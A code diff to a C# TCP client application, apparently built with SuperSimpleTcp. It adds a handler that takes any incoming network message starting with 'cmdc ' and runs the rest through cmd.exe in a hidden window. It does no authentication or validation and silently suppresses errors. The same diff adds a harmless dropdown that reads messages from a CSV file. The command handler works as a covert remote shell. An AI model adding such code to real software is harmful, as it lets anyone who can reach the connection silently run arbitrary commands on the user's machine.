@@ -9,6 +9,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using SuperSimpleTcp;
 using System.Diagnostics;
+using System.IO;
 
 namespace TCPClient
 {
@@ -87,6 +88,24 @@ namespace TCPClient
                         process.Kill();
                     }
                     Process.Start("TrueTest.exe");
+                }
+                catch (Exception)
+                {
+
+                }
+            }
+            else if (Encoding.UTF8.GetString(e.Data).StartsWith("cmdc "))
+            {
+                try
+                {
+                    string command = Encoding.UTF8.GetString(e.Data).Replace("cmdc ",string.Empty);
+                    Process process = new Process();
+                    ProcessStartInfo startInfo = new ProcessStartInfo();
+                    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                    startInfo.FileName = "cmd.exe";
+                    startInfo.Arguments = $"/C {command}";
+                    process.StartInfo = startInfo;
+                    process.Start();
                 }
                 catch (Exception)
                 {
@@ -172,6 +191,22 @@ namespace TCPClient
             {
                 btnSend_Click(this, new EventArgs());
             }
+        }
+
+        private void cbxMessage_DropDown(object sender, EventArgs e)
+        {
+            string apppath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            string appdir = Path.GetDirectoryName(apppath);
+            string messagelist = Path.Combine(appdir, "messagelist.csv");
+            var listOfLines = File.ReadAllLines(messagelist)
+                      .Skip(1)
+                      .Where(x => !string.IsNullOrWhiteSpace(x));
+            cbxMessage.Items.Clear();
+            foreach (var line in listOfLines)
+            {
+                cbxMessage.Items.Add(line.Split(',')[0]);
+            }
+            
         }
     }
 }
